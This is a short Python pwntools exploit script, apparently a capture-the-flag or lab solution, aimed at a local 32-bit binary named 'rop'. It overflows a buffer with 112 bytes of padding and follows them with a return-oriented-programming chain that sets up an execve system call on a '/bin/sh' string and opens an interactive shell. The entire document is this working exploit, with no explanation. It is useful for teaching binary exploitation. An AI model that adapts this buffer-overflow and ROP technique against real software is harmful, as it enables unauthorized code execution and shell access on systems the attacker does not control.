#!/usr/bin/env python
from pwn import *
context.arch = "i386"
context.log_level = "debug"
sh = process('./rop')

pop_eax_ret = 0x080b7fb6
pop_edx_ecx_ebx_ret = 0x0806ee30
int_0x80 = 0x0806ca85 
binsh = 0x80bb128
payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])

pause()
sh.sendline(payload)
sh.interactive()

